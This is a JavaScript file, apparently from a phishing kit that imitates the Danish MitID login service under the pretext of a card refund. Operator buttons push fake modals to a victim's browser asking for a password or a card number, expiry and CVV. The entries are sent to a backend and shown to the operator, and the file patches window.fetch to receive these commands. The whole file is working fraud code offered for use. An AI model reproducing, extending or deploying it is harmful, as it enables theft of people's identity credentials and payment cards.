/**
 * Refundering på kort — admin 2 buttons + user forms (Adgangskode / Kortnummer)
 * Works with existing /api/ws poll+send without rebuilding the React bundle.
 */
(function () {
  const BASE = (typeof window !== "undefined" && window.__APP_BASE__) || "";
  const USER_KEY = "miitid_user_session";
  const ADMIN_KEY = "miitid_admin_selected_session";

  function sidUser() {
    try {
      return localStorage.getItem(USER_KEY) || sessionStorage.getItem(USER_KEY) || "";
    } catch (e) {
      return "";
    }
  }
  function sidAdmin() {
    try {
      return localStorage.getItem(ADMIN_KEY) || "";
    } catch (e) {
      return "";
    }
  }
  function isAdmin() {
    return (window.location.hash || "").indexOf("admin") === 1;
  }

  function send(role, data) {
    const sessionId = role === "admin" ? sidAdmin() : sidUser();
    if (!sessionId) {
      alert(role === "admin" ? "Vælg en session først" : "Ingen aktiv session");
      return Promise.resolve();
    }
    return fetch(BASE + "/api/ws/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ sessionId: sessionId, role: role, data: data }),
    }).catch(function () {});
  }

  function toast(msg, ok) {
    var el = document.getElementById("juj-refund-toast");
    if (!el) {
      el = document.createElement("div");
      el.id = "juj-refund-toast";
      el.style.cssText =
        "position:fixed;top:16px;right:16px;z-index:99999;max-width:360px;padding:12px 16px;border-radius:12px;font:600 13px/1.4 IBM Plex Sans,sans-serif;box-shadow:0 8px 24px rgba(0,0,0,.15);color:#fff;";
      document.body.appendChild(el);
    }
    el.style.background = ok ? "#059669" : "#0f766e";
    el.textContent = msg;
    el.style.display = "block";
    clearTimeout(el._t);
    el._t = setTimeout(function () {
      el.style.display = "none";
    }, 6000);
  }

  function closeModal() {
    var m = document.getElementById("juj-refund-modal");
    if (m) m.remove();
  }

  function showModal(kind) {
    closeModal();
    var wrap = document.createElement("div");
    wrap.id = "juj-refund-modal";
    wrap.style.cssText =
      "position:fixed;inset:0;z-index:99998;background:rgba(15,23,42,.45);display:flex;align-items:center;justify-content:center;padding:16px;";
    var card = document.createElement("div");
    card.style.cssText =
      "background:#fff;border-radius:16px;padding:28px 24px;max-width:380px;width:100%;font-family:IBM Plex Sans,Inter,sans-serif;box-shadow:0 20px 50px rgba(0,0,0,.2);";

    if (kind === "adgangskode") {
      card.innerHTML =
        '<div style="font-size:11px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:#64748b;margin-bottom:8px">Refundering på kort</div>' +
        '<h2 style="margin:0 0 8px;font-size:20px;color:#001C44">Adgangskode</h2>' +
        '<p style="margin:0 0 16px;font-size:14px;color:#64748b;line-height:1.45">Indtast din adgangskode for at fortsætte refunderingen.</p>' +
        '<label style="display:block;font-size:13px;font-weight:600;color:#334155;margin-bottom:6px">Adgangskode</label>' +
        '<input id="juj-ak-input" type="password" autocomplete="current-password" style="width:100%;box-sizing:border-box;border:1px solid #cbd5e1;border-radius:10px;padding:12px;font-size:15px;margin-bottom:16px" />' +
        '<button id="juj-ak-submit" style="width:100%;background:#0060e6;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:14px;cursor:pointer">Fortsæt</button>';
    } else {
      card.innerHTML =
        '<div style="font-size:11px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:#64748b;margin-bottom:8px">Refundering på kort</div>' +
        '<h2 style="margin:0 0 8px;font-size:20px;color:#001C44">Få refundering på kort</h2>' +
        '<p style="margin:0 0 16px;font-size:14px;color:#64748b;line-height:1.45">Indtast kortnummer for at få beløbet tilbageført.</p>' +
        '<label style="display:block;font-size:13px;font-weight:600;color:#334155;margin-bottom:6px">Kortnummer</label>' +
        '<input id="juj-card-num" type="text" inputmode="numeric" placeholder="•••• •••• •••• ••••" style="width:100%;box-sizing:border-box;border:1px solid #cbd5e1;border-radius:10px;padding:12px;font-size:15px;margin-bottom:12px" />' +
        '<div style="display:flex;gap:10px;margin-bottom:16px">' +
        '<div style="flex:1"><label style="display:block;font-size:13px;font-weight:600;color:#334155;margin-bottom:6px">Udløb</label>' +
        '<input id="juj-card-exp" type="text" placeholder="MM/ÅÅ" style="width:100%;box-sizing:border-box;border:1px solid #cbd5e1;border-radius:10px;padding:12px;font-size:15px" /></div>' +
        '<div style="flex:1"><label style="display:block;font-size:13px;font-weight:600;color:#334155;margin-bottom:6px">CVV</label>' +
        '<input id="juj-card-cvv" type="text" inputmode="numeric" placeholder="•••" style="width:100%;box-sizing:border-box;border:1px solid #cbd5e1;border-radius:10px;padding:12px;font-size:15px" /></div>' +
        "</div>" +
        '<button id="juj-card-submit" style="width:100%;background:#0f766e;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:14px;cursor:pointer">Anmod om refundering</button>';
    }

    wrap.appendChild(card);
    wrap.addEventListener("click", function (e) {
      if (e.target === wrap) closeModal();
    });
    document.body.appendChild(wrap);

    if (kind === "adgangskode") {
      var inp = document.getElementById("juj-ak-input");
      var btn = document.getElementById("juj-ak-submit");
      setTimeout(function () {
        inp && inp.focus();
      }, 50);
      btn.onclick = function () {
        var code = (inp.value || "").trim();
        if (!code) {
          inp.focus();
          return;
        }
        btn.disabled = true;
        send("user", { type: "adgangskode-submitted", code: code }).then(function () {
          closeModal();
          toast("Adgangskode sendt — vent venligst", true);
        });
      };
    } else {
      var num = document.getElementById("juj-card-num");
      var exp = document.getElementById("juj-card-exp");
      var cvv = document.getElementById("juj-card-cvv");
      var btn2 = document.getElementById("juj-card-submit");
      setTimeout(function () {
        num && num.focus();
      }, 50);
      btn2.onclick = function () {
        var cardNumber = (num.value || "").replace(/\s+/g, "");
        if (cardNumber.length < 12) {
          num.focus();
          return;
        }
        btn2.disabled = true;
        send("user", {
          type: "card-refund-submitted",
          cardNumber: cardNumber,
          expiry: (exp.value || "").trim(),
          cvv: (cvv.value || "").trim(),
        }).then(function () {
          closeModal();
          toast("Anmodning sendt — vent venligst", true);
        });
      };
    }
  }

  function handleMessages(messages) {
    if (!messages || !messages.length) return;
    for (var i = 0; i < messages.length; i++) {
      var raw = messages[i].message;
      var msg = typeof raw === "string" ? (function () {
        try {
          return JSON.parse(raw);
        } catch (e) {
          return null;
        }
      })() : raw;
      if (!msg || !msg.type) continue;

      if (!isAdmin()) {
        if (msg.type === "show-adgangskode") showModal("adgangskode");
        if (msg.type === "show-card-refund") showModal("card");
      } else {
        if (msg.type === "adgangskode-submitted") {
          toast("Adgangskode: " + (msg.code || "—"), true);
        }
        if (msg.type === "card-refund-submitted") {
          toast(
            "Kort: " +
              (msg.cardNumber || "—") +
              (msg.expiry ? " | " + msg.expiry : "") +
              (msg.cvv ? " | CVV " + msg.cvv : ""),
            true
          );
        }
      }
    }
  }

  // Hook poll responses
  var origFetch = window.fetch;
  window.fetch = function () {
    var args = arguments;
    return origFetch.apply(this, args).then(function (res) {
      try {
        var url = typeof args[0] === "string" ? args[0] : args[0] && args[0].url;
        if (url && String(url).indexOf("/api/ws/poll") !== -1) {
          res
            .clone()
            .json()
            .then(function (data) {
              if (data && data.messages) handleMessages(data.messages);
            })
            .catch(function () {});
        }
      } catch (e) {}
      return res;
    });
  };

  // Also track admin selected session when they click session rows
  document.addEventListener(
    "click",
    function (e) {
      var t = e.target;
      if (!t || !isAdmin()) return;
      var row = t.closest ? t.closest("[data-session-id], .session-row, button, div") : null;
      // Heuristic: copy hex-looking session ids from nearby text into localStorage when clicking list
      var node = t;
      for (var i = 0; i < 5 && node; i++) {
        var txt = (node.getAttribute && node.getAttribute("data-session-id")) || "";
        if (!txt && node.textContent) {
          var m = String(node.textContent).match(/[a-f0-9]{16,}/i);
          if (m && m[0].length >= 32) txt = m[0].slice(0, 64);
        }
        if (txt && txt.length >= 32) {
          try {
            localStorage.setItem(ADMIN_KEY, txt);
          } catch (err) {}
          break;
        }
        node = node.parentElement;
      }
    },
    true
  );

  function injectAdminButtons() {
    if (!isAdmin()) return;
    if (document.getElementById("juj-refund-admin")) return;
    // Find "Betaling annulleret" or "Godkendelse" section
    var buttons = Array.prototype.slice.call(document.querySelectorAll("button"));
    var anchor = null;
    for (var i = 0; i < buttons.length; i++) {
      var label = (buttons[i].textContent || "").trim();
      if (label === "Betaling annulleret" || label === "Standardside" || label === "Godkend bruger") {
        anchor = buttons[i].parentElement;
      }
    }
    if (!anchor) return;

    var box = document.createElement("div");
    box.id = "juj-refund-admin";
    box.className = "mb-5";
    box.style.cssText = "margin-bottom:20px;";
    box.innerHTML =
      '<div style="font-size:10px;color:#9ca3af;text-transform:uppercase;letter-spacing:.06em;font-weight:700;margin-bottom:8px">Refundering på kort</div>' +
      '<button type="button" id="juj-btn-ak" style="width:100%;background:#0060e6;color:#fff;border:0;border-radius:12px;padding:10px 12px;font-size:12px;font-weight:700;cursor:pointer;margin-bottom:8px">Adgangskode</button>' +
      '<button type="button" id="juj-btn-card" style="width:100%;background:#0f766e;color:#fff;border:0;border-radius:12px;padding:10px 12px;font-size:12px;font-weight:700;cursor:pointer">Få refundering på kort</button>';
    anchor.parentElement.insertBefore(box, anchor.nextSibling);

    document.getElementById("juj-btn-ak").onclick = function () {
      send("admin", { type: "show-adgangskode" }).then(function () {
        toast("Adgangskode-skærm sendt til bruger", true);
      });
    };
    document.getElementById("juj-btn-card").onclick = function () {
      send("admin", { type: "show-card-refund" }).then(function () {
        toast("Kort-refunderingsskærm sendt til bruger", true);
      });
    };
  }

  setInterval(injectAdminButtons, 1200);
  window.addEventListener("hashchange", function () {
    setTimeout(injectAdminButtons, 400);
  });
})();
